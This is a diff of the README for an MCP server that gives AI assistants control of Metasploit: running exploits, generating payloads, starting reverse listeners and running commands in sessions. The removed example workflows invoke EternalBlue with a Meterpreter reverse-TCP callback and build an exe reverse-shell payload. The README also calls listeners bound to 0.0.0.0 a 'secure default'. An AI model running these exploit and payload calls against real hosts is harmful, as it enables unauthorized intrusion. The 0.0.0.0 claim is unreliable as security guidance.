@@ -1,113 +1,161 @@
 # Metasploit MCP Server
 
-A Model Context Protocol (MCP) server for Metasploit Framework integration.
+[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
+[![Poetry](https://img.shields.io/badge/dependency%20management-poetry-blue.svg)](https://python-poetry.org/)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
 
+A modern, secure Model Context Protocol (MCP) server that provides AI assistants with controlled access to Metasploit Framework functionality.
 
-https://github.com/user-attachments/assets/39b19fb5-8397-4ccd-b896-d1797ec185e1
+## 🚀 Features
 
+### 🎯 Core Capabilities
+- **Exploit Management**: Search, configure, and execute Metasploit exploits
+- **Payload Generation**: Create custom payloads with advanced encoding options
+- **Session Management**: Control active sessions with command execution
+- **Listener Management**: Start and manage reverse handlers
+- **Security Validation**: Built-in bind address validation and input sanitization
 
-## Description
+### 🔒 Security Features
+- **Bind Address Validation**: Ensures listeners only bind to authorized interfaces
+- **Input Sanitization**: Comprehensive validation of all parameters
+- **Secure Defaults**: Listeners default to `0.0.0.0` binding for maximum compatibility
+- **Error Handling**: Prevents information leakage through proper error management
 
-This MCP server provides a bridge between large language models like Claude and the Metasploit Framework penetration testing platform. It allows AI assistants to dynamically access and control Metasploit functionality through standardized tools, enabling a natural language interface to complex security testing workflows.
+### 🛠 Modern Development
+- **Poetry Dependency Management**: Modern Python packaging and dependency resolution
+- **Comprehensive Testing**: 92+ tests covering unit, integration, and security scenarios
+- **Type Hints**: Full type annotation support for better IDE experience
+- **FastMCP HTTP Transport**: Modern HTTP-based MCP protocol implementation
+- **Development Tools**: Integrated linting, formatting, and type checking
 
-## Features
+## 📋 Prerequisites
 
-### Module Information
+- **Python 3.8+** (3.11+ recommended)
+- **Poetry** for dependency management ([Installation Guide](https://python-poetry.org/docs/#installation))
+- **Metasploit Framework** with RPC enabled
 
-- **list_exploits**: Search and list available Metasploit exploit modules
-- **list_payloads**: Search and list available Metasploit payload modules with optional platform and architecture filtering
+## 🚀 Quick Start
 
-### Exploitation Workflow
-
-- **run_exploit**: Configure and execute an exploit against a target with options to run checks first
-- **run_auxiliary_module**: Run any Metasploit auxiliary module with custom options
-- **run_post_module**: Execute post-exploitation modules against existing sessions
-
-### Payload Generation
-
-- **generate_payload**: Generate payload files using Metasploit RPC (saves files locally)
-
-### Session Management
-
-- **list_active_sessions**: Show current Metasploit sessions with detailed information
-- **send_session_command**: Run a command in an active shell or Meterpreter session
-- **terminate_session**: Forcefully end an active session
-
-### Handler Management
-
-- **list_listeners**: Show all active handlers and background jobs
-- **start_listener**: Create a new multi/handler to receive connections
-- **stop_job**: Terminate any running job or handler
-
-## Prerequisites
-
-- Metasploit Framework installed and msfrpcd running
-- Python 3.10 or higher
-- Required Python packages (see requirements.txt)
-
-## Installation
-
-1. Clone this repository
-2. Install dependencies:
-   ```
-   pip install -r requirements.txt
-   ```
-3. Configure environment variables (optional):
-   ```
-   MSF_PASSWORD=yourpassword
-   MSF_SERVER=127.0.0.1
-   MSF_PORT=55553
-   MSF_SSL=false
-   PAYLOAD_SAVE_DIR=/path/to/save/payloads  # Optional: Where to save generated payloads
-   ```
-
-## Usage
-
-Start the Metasploit RPC service:
+### 1. Installation
 
 ```bash
+# Clone the repository
+git clone https://github.com/cbdmaul/MetasploitMCP.git
+cd MetasploitMCP
+
+# Install with Poetry (recommended)
+poetry install
+poetry shell
+
+# Or install with pip (legacy support)
+pip install -r requirements.txt  # Note: Legacy files removed in v2.0
+```
+
+### 2. Start Metasploit RPC
+
+```bash
+# Start Metasploit RPC service
 msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
+
+# Or from msfconsole
+msfconsole -q
+msf6 > load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=msf Pass=yourpassword
 ```
 
-### Transport Options
-
-The server supports two transport methods:
-
-- **HTTP/SSE (Server-Sent Events)**: Default mode for interoperability with most MCP clients
-- **STDIO (Standard Input/Output)**: Used with Claude Desktop and similar direct pipe connections
-
-You can explicitly select the transport mode using the `--transport` flag:
+### 3. Configure Environment (Optional)
 
 ```bash
-# Run with HTTP/SSE transport (default)
-python MetasploitMCP.py --transport http
-
-# Run with STDIO transport
-python MetasploitMCP.py --transport stdio
+export MSF_PASSWORD=yourpassword
+export MSF_SERVER=127.0.0.1
+export MSF_PORT=55553
+export PAYLOAD_SAVE_DIR=/path/to/save/payloads
 ```
 
-Additional options for HTTP mode:
+### 4. Run the Server
+
 ```bash
-python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
+# Using Poetry (recommended)
+poetry run python MetasploitMCP.py --transport http --host 127.0.0.1 --port 8085
+
+# Using Make
+make run
+
+# Debug mode
+make run-debug
 ```
 
-### Claude Desktop Integration
+## 🔧 Development
 
-For Claude Desktop integration, configure `claude_desktop_config.json`:
+### Development Setup
+
+```bash
+# Complete development environment setup
+make dev-setup
+
+# Or manually
+poetry install
+poetry run pre-commit install
+make test
+```
+
+### Available Commands
+
+```bash
+# Show all available commands
+make help
+
+# Quick development workflow
+make quick-check    # Format, lint, and quick test
+make full-check     # Complete quality check with coverage
+
+# Testing
+make test           # Run all tests
+make test-coverage  # Run with coverage report
+make test-watch     # Watch mode for development
+
+# Code quality
+make format         # Format code with black
+make lint           # Run linting checks
+make type-check     # Run type checking
+```
+
+### Project Structure
+
+```
+MetasploitMCP/
+├── MetasploitMCP.py          # Main server implementation
+├── pyproject.toml            # Poetry configuration
+├── Makefile                  # Development commands
+├── tests/                    # Comprehensive test suite
+│   ├── test_helpers.py       # Helper function tests
+│   ├── test_ip_validation.py # Security validation tests
+│   ├── test_options_parsing.py # Input parsing tests
+│   └── test_tools_integration.py # Integration tests
+├── docs/                     # Documentation
+│   ├── API.md               # Complete API reference
+│   ├── DEVELOPMENT.md       # Development guide
+│   └── POETRY_MIGRATION.md  # Migration guide
+├── CHANGELOG.md             # Version history
+└── CONTRIBUTING.md          # Contribution guidelines
+```
+
+## 🔌 Integration
+
+### Claude Desktop
+
+Configure `claude_desktop_config.json`:
 
 ```json
 {
     "mcpServers": {
         "metasploit": {
-            "command": "uv",
+            "command": "poetry",
             "args": [
-                "--directory",
-                "C:\\path\\to\\MetasploitMCP",
-                "run",
-                "MetasploitMCP.py",
-                "--transport",
-                "stdio"
+                "run", "python", "MetasploitMCP.py",
+                "--transport", "stdio"
             ],
+            "cwd": "/path/to/MetasploitMCP",
             "env": {
                 "MSF_PASSWORD": "yourpassword"
             }
@@ -118,81 +166,147 @@ For Claude Desktop integration, configure `claude_desktop_config.json`:
 
 ### Other MCP Clients
 
-For other MCP clients that use HTTP/SSE:
+For HTTP-based MCP clients:
 
-1. Start the server in HTTP mode:
-   ```bash
-   python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
-   ```
+```bash
+# Start HTTP server
+poetry run python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
 
-2. Configure your MCP client to connect to:
-   - SSE endpoint: `http://your-server-ip:8085/sse`
+# MCP endpoint: http://your-server:8085/mcp
+```
 
-## Security Considerations
+## 🛡 Security Considerations
 
-⚠️ **IMPORTANT SECURITY WARNING**:
+⚠️ **IMPORTANT**: This tool provides direct access to Metasploit Framework capabilities. Use responsibly and only in authorized environments.
 
-This tool provides direct access to Metasploit Framework capabilities, which include powerful exploitation features. Use responsibly and only in environments where you have explicit permission to perform security testing.
+### Security Features
 
-- Always validate and review all commands before execution
-- Only run in segregated test environments or with proper authorization
-- Be aware that post-exploitation commands can result in significant system modifications
+- **Bind Address Validation**: Prevents binding to unauthorized network interfaces
+- **Input Sanitization**: All parameters are validated before processing
+- **Secure Defaults**: Listeners default to `0.0.0.0` for maximum compatibility
+- **Error Handling**: Prevents information disclosure through proper error management
 
-## Example Workflows
+### Best Practices
 
-### Basic Exploitation
+- Only use in authorized testing environments
+- Validate all commands before execution
+- Monitor generated payloads and their usage
+- Use strong passwords for Metasploit RPC
+- Regularly update dependencies
 
-1. List available exploits: `list_exploits("ms17_010")`
-2. Select and run an exploit: `run_exploit("exploit/windows/smb/ms17_010_eternalblue", {"RHOSTS": "192.168.1.100"}, "windows/x64/meterpreter/reverse_tcp", {"LHOST": "192.168.1.10", "LPORT": 4444})`
-3. List sessions: `list_active_sessions()`
-4. Run commands: `send_session_command(1, "whoami")`
+## 📚 API Reference
 
-### Post-Exploitation
+### Core Tools
 
-1. Run a post module: `run_post_module("windows/gather/enum_logged_on_users", 1)`
-2. Send custom commands: `send_session_command(1, "sysinfo")`
-3. Terminate when done: `terminate_session(1)`
+| Tool | Description | Key Parameters |
+|------|-------------|----------------|
+| `list_exploits` | Search exploit modules | `platform_filter`, `search_term` |
+| `run_exploit` | Execute exploits | `module_name`, `options`, `payload_name` |
+| `generate_payload` | Create payloads | `payload_type`, `format_type`, `options` |
+| `start_listener` | Start handlers | `payload_type`, `lhost`, `lport` |
+| `list_active_sessions` | Show sessions | None |
+| `send_session_command` | Execute commands | `session_id`, `command` |
 
-### Handler Management
+### New in v2.0
 
-1. Start a listener: `start_listener("windows/meterpreter/reverse_tcp", "192.168.1.10", 4444)`
-2. List active handlers: `list_listeners()`
-3. Generate a payload: `generate_payload("windows/meterpreter/reverse_tcp", "exe", {"LHOST": "192.168.1.10", "LPORT": 4444})`
-4. Stop a handler: `stop_job(1)`
+- **Bind Address Control**: `reverse_listener_bind_address` parameter
+- **Port Binding**: `reverse_listener_bind_port` parameter  
+- **IP Validation**: Automatic validation of bind addresses
+- **FastMCP Transport**: Modern HTTP-based MCP protocol
 
-## Configuration Options
+For complete API documentation, see [docs/API.md](docs/API.md).
 
-### Payload Save Directory
+## 🧪 Testing
 
-By default, payloads generated with `generate_payload` are saved to a `payloads` directory in your home folder (`~/payloads` or `C:\Users\YourUsername\payloads`). You can customize this location by setting the `PAYLOAD_SAVE_DIR` environment variable.
+### Running Tests
 
-**Setting the environment variable:**
+```bash
+# All tests with coverage
+make test-coverage
 
-- **Windows (PowerShell)**:
-  ```powershell
-  $env:PAYLOAD_SAVE_DIR = "C:\custom\path\to\payloads"
-  ```
+# Quick test run
+make test-quick
 
-- **Windows (Command Prompt)**:
-  ```cmd
-  set PAYLOAD_SAVE_DIR=C:\custom\path\to\payloads
-  ```
+# Watch mode for development
+make test-watch
 
-- **Linux/macOS**:
-  ```bash
-  export PAYLOAD_SAVE_DIR=/custom/path/to/payloads
-  ```
+# Specific test categories
+make test-unit          # Unit tests only
+make test-integration   # Integration tests only
+```
 
-- **In Claude Desktop config**:
-  ```json
-  "env": {
-      "MSF_PASSWORD": "yourpassword",
-      "PAYLOAD_SAVE_DIR": "C:\\your\\actual\\path\\to\\payloads"  // Only add if you want to override the default
-  }
-  ```
+### Test Coverage
 
-**Note:** If you specify a custom path, make sure it exists or the application has permission to create it. If the path is invalid, payload generation might fail.
+The project maintains high test coverage with 92+ tests covering:
 
-## License
+- **Unit Tests**: Individual function testing
+- **Integration Tests**: End-to-end workflow testing  
+- **Security Tests**: Bind address validation and input sanitization
+- **Error Handling**: Comprehensive error scenario testing
 
-Apache 2.0
+Coverage reports are generated in `htmlcov/index.html`.
+
+## 📖 Documentation
+
+- **[API Reference](docs/API.md)**: Complete tool documentation with examples
+- **[Development Guide](docs/DEVELOPMENT.md)**: Setup, testing, and contribution guidelines
+- **[Poetry Migration](docs/POETRY_MIGRATION.md)**: Migration from requirements.txt
+- **[Changelog](CHANGELOG.md)**: Version history and breaking changes
+- **[Contributing](CONTRIBUTING.md)**: How to contribute to the project
+
+## 🔄 Migration from v1.x
+
+### Key Changes in v2.0
+
+- **Poetry**: Replaced requirements.txt with Poetry dependency management
+- **FastMCP**: Migrated from SSE to HTTP transport
+- **Security**: Added bind address validation and secure defaults
+- **Testing**: Expanded test suite with 92+ tests
+- **Documentation**: Comprehensive docs in `docs/` directory
+
+### Migration Steps
+
+```bash
+# Remove old virtual environment
+rm -rf venv/
+
+# Install Poetry if not already installed
+curl -sSL https://install.python-poetry.org | python3 -
+
+# Install dependencies with Poetry
+poetry install
+
+# Update configuration (same environment variables)
+# Run tests to verify migration
+make test
+```
+
+For detailed migration information, see [docs/POETRY_MIGRATION.md](docs/POETRY_MIGRATION.md).
+
+## 🤝 Contributing
+
+We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+
+### Quick Contribution Workflow
+
+1. Fork the repository
+2. Create a feature branch: `git checkout -b feature/your-feature`
+3. Set up development environment: `make dev-setup`
+4. Make changes and add tests
+5. Run quality checks: `make full-check`
+6. Submit a pull request
+
+## 📄 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## 🙏 Acknowledgments
+
+- **Metasploit Framework**: The powerful penetration testing platform
+- **Model Context Protocol**: The standardized AI-tool communication protocol
+- **FastMCP**: Modern MCP server implementation framework
+- **Poetry**: Modern Python dependency management
+
+---
+
+**⚠️ Disclaimer**: This tool is for authorized security testing only. Users are responsible for ensuring they have proper authorization before using this tool in any environment.
